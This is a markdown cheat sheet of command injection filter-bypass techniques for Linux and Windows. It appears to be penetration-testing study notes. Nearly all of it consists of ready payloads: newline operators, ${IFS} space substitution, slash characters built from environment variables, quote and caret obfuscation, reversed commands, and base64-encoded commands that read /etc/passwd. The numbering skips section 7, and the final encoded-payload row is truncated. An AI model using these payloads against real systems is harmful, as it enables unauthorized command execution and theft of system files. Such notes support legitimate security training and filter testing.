# Identifying Filters

## <mark style="color:red;">🛡️ Command Injection Bypass Techniques Cheat Sheet 🛡️</mark>

### <mark style="color:blue;">🔍 1. Detecting Filters</mark>

#### <mark style="color:green;">🚫 Filter Types</mark>

* **Character Blacklists**: Blocks specific characters (`;`, `&`, `|`, spaces, etc.)
* **Command Blacklists**: Blocks specific commands (`whoami`, `cat`, etc.)
* **WAF Detection**: Security mechanisms that deny suspicious requests

#### <mark style="color:green;">🧪 Testing for Filters</mark>

* 🔄 Try one character at a time to identify which ones are blocked
* 🔄 Test basic injection operators: `;`, `&&`, `||`, `|`, etc.
* 🔄 Check if spaces are filtered
* 🔄 Test common commands to identify command blacklists

***

### <mark style="color:blue;">🔀 2. Bypassing Injection Operator Filters</mark>

<table data-full-width="true"><thead><tr><th>🚫 Blocked</th><th>✅ Alternative</th><th>💻 Example</th></tr></thead><tbody><tr><td><code>;</code></td><td>Newline (<code>%0a</code>)</td><td><code>127.0.0.1%0awhoami</code></td></tr><tr><td><code>&#x26;&#x26;</code></td><td><code>%0a</code> (newline)</td><td><code>127.0.0.1%0awhoami</code></td></tr><tr><td><code>;</code></td><td>Environment variable</td><td><code>127.0.0.1${LS_COLORS:10:1}whoami</code></td></tr></tbody></table>

***

### <mark style="color:blue;">⌨️ 3. Bypassing Space Filters</mark>

<table data-full-width="true"><thead><tr><th>🔧 Method</th><th>📝 Syntax</th><th>💻 Example</th></tr></thead><tbody><tr><td>Tab character</td><td><code>%09</code></td><td><code>127.0.0.1%0a%09whoami</code></td></tr><tr><td><code>$IFS</code> variable</td><td><code>${IFS}</code></td><td><code>127.0.0.1%0awhoami${IFS}-a</code></td></tr><tr><td>Brace expansion</td><td><code>{command,arg}</code></td><td><code>127.0.0.1%0a{ls,-la}</code></td></tr></tbody></table>

***

### <mark style="color:blue;">🔣 4. Bypassing Slash/Character Filters</mark>

#### <mark style="color:green;">🐧 Linux Methods</mark>

<table data-full-width="true"><thead><tr><th>🔤 Character</th><th>🔄 Alternative Method</th><th>💻 Example</th></tr></thead><tbody><tr><td><code>/</code></td><td><code>${PATH:0:1}</code></td><td><code>cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd</code></td></tr><tr><td><code>/</code></td><td><code>${HOME:0:1}</code></td><td><code>cat${IFS}${HOME:0:1}etc${HOME:0:1}passwd</code></td></tr><tr><td><code>;</code></td><td><code>${LS_COLORS:10:1}</code></td><td><code>127.0.0.1${LS_COLORS:10:1}${IFS}whoami</code></td></tr></tbody></table>

#### <mark style="color:green;">🪟 Windows Methods</mark>

<table data-full-width="true"><thead><tr><th>🔤 Character</th><th>🔄 Alternative Method</th><th>💻 Example</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>%HOMEPATH:~6,-11%</code></td><td><code>type%HOMEPATH:~6,-11%Windows%HOMEPATH:~6,-11%win.ini</code></td></tr><tr><td><code>\</code></td><td><code>$env:HOMEPATH[0]</code></td><td>PowerShell: <code>type$env:HOMEPATH[0]Windows$env:HOMEPATH[0]win.ini</code></td></tr></tbody></table>

#### <mark style="color:green;">🔄 Character Shifting</mark>

* 🐧 Linux: `$(tr '!-}' '"-~'<<<[)` produces `\`
* 🔍 Find ASCII character before your target and shift it

***

### <mark style="color:blue;">🎭 5. Bypassing Command Blacklists</mark>

#### <mark style="color:green;">🔡 Command Obfuscation - Works on Linux & Windows</mark>

<table data-full-width="true"><thead><tr><th>🔧 Method</th><th>💻 Example</th><th>📝 Notes</th></tr></thead><tbody><tr><td>Single quotes</td><td><code>w'h'o'am'i</code></td><td>Must have even number of quotes</td></tr><tr><td>Double quotes</td><td><code>w"h"o"am"i</code></td><td>Must have even number of quotes</td></tr></tbody></table>

#### <mark style="color:green;">🐧 Linux-Only Obfuscation</mark>

<table data-full-width="true"><thead><tr><th>🔧 Method</th><th>💻 Example</th><th>📝 Notes</th></tr></thead><tbody><tr><td>Backslash</td><td><code>w\ho\am\i</code></td><td>Insert <code>\</code> anywhere in command</td></tr><tr><td>Positional parameter</td><td><code>who$@ami</code></td><td>Insert <code>$@</code> anywhere in command</td></tr></tbody></table>

#### <mark style="color:green;">🪟 Windows-Only Obfuscation</mark>

<table data-full-width="true"><thead><tr><th>🔧 Method</th><th>💻 Example</th><th>📝 Notes</th></tr></thead><tbody><tr><td>Caret</td><td><code>who^ami</code></td><td>Insert <code>^</code> anywhere in command</td></tr></tbody></table>

***

### <mark style="color:blue;">🧙‍♂️ 6. Advanced Obfuscation Techniques</mark>

#### <mark style="color:green;">🔠 Case Manipulation</mark>

* **🪟 Windows**: Case insensitive - `WhOaMi` works directly
* **🐧 Linux**: Case sensitive - use transformation:
  * `$(tr "[A-Z]" "[a-z]" <<<"WhOaMi")`
  * `$(a="WhOaMi"; printf %s "${a,,}")`

#### <mark style="color:green;">🔄 Reversed Commands</mark>

* **🐧 Linux**:
  * Generate: `echo 'whoami' | rev` → `imaohw`
  * Execute: `$(rev <<< 'imaohw')`
* **🪟 Windows PowerShell**:
  * Generate: `"whoami"[-1..-20] -join ''`
  * Execute: `iex "$('imaohw'[-1..-20] -join '')"`

#### <mark style="color:green;">🔐 Encoded Commands</mark>

* **🐧 Linux Base64**:
  * Encode: `echo -n 'cat /etc/passwd' | base64` → `Y2F0IC9ldGMvcGFzc3dk`
  * Execute: `$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)`
  * Alternative: `bash <<< $(base64 -d <<< Y2F0IC9ldGMvcGFzc3dk)`
* <mark style="color:green;">**🪟 Windows PowerShell**</mark><mark style="color:green;">:</mark>
  * Encode: `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
  * Execute: `powershell -e dwBoAG8AYQBtAGkA`
  * Alternative: `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`

***

### <mark style="color:blue;">💻 8. Common Payloads Examples</mark>

<table data-full-width="true"><thead><tr><th width="496">🎯 Scenario</th><th>🔧 Payload Example</th></tr></thead><tbody><tr><td>Basic space bypass</td><td><code>127.0.0.1%0awhoami${IFS}</code></td></tr><tr><td>Multiple bypasses</td><td><code>127.0.0.1%0aw'h'o'a'm'i${IFS}</code></td></tr><tr><td>Full path bypass</td><td><code>127.0.0.1%0ac'a't'${IFS}${PATH:0:1}e'tc'${PATH:0:1}p'a's's'w'd'</code></td></tr><tr><td>Windows cmd bypass</td><td><code>127.0.0.1%0aw^ho^am^i</code></td></tr><tr><td>Encoded payload</td><td>`127.0.0.1%0a$(echo Y2F0IC9ldGMvcGFzc3dk</td></tr></tbody></table>

***

### <mark style="color:blue;">🚨 9. Quick Reference by OS</mark>

#### <mark style="color:green;">🐧 Linux-Specific Techniques</mark>

* Environment variables: `${IFS}`, `${PATH:0:1}`
* Bash expansion: `{ls,-la}`
* Command substitution: `$(command)`
* Character transformation: `$(tr "[A-Z]" "[a-z]" <<<"WhOaMi")`

#### <mark style="color:green;">🪟 Windows-Specific Techniques</mark>

* Caret insertion: `w^ho^am^i`
* Environment variables: `%HOMEPATH:~6,-11%`
* PowerShell array indexing: `$env:HOMEPATH[0]`
* PowerShell encoding: `powershell -e BASE64STRING`
